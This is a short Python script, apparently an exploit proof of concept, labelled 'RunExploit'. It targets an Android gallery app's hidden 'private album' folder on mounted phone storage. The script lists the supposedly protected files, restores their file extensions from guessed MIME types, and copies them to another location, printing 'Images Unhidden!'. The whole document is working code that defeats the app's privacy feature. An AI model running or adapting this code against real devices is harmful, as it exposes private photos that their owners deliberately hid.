# author : @tahaafarooq
# date : 22/09/2023
# desc : pewpew

import os
import shutil
import platform
import mimetypes


# check operating system
def check_os():
    system = platform.system()
    if system == "Windows":
        return "Windows"
    elif system == "Linux":
        return "Linux"


class RunExploit(object):
    def __init__(self):
        self.author = "@tahaafarooq"

    def check_hidden_image_folder(self, path):
        folder = f"{path}/Internal shared storage/Android/data/com.android.gallery3d/.privatealbum/.encryptfiles/"
        if os.path.exists(folder):
            return "Found"
        else:
            return "Not Found"

    def unhide_images(self, path, destination):
        folder = f"{path}/Internal shared storage/Android/data/com.android.gallery3d/.privatealbum/.encryptfiles/"
        files = os.listdir(folder)

        for file in files:
            sf_path = os.path.join(folder, file)

            mt, _ = mimetypes.guess_type(sf_path)

            if mt:
                ext = mimetypes.guess_extension(mt)
                if ext:
                    new_file_name = f"{os.path.splitext(file)[0]}{ext}"
                    df_path = os.path.join(destination, new_file_name)
                else:
                    df_path = os.path.join(destination, file)
            else:
                df_path = os.path.join(destination, file)

            shutil.copy(sf_path, df_path)

        print("Images Unhidden! Abracadabra!")

        return "Done"
